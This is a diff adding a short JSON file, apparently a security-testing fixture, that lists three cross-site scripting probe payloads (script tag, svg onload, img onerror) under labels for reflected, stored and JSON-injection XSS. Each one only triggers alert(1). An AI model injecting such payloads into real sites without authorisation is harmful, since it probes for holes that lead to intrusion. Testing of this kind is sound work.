@@ -1,0 +1,11 @@
+{
+  "ReflectedXSS": {
+    "payload": "<script>alert(1)</script>"
+  },
+  "StoredXSS": {
+    "payload": "<svg/onload=alert(1)>"
+  },
+  "JSONInjection": {
+    "payload": "{\"key\": \"<img src=x onerror=alert(1)>\"}"
+  }
+}
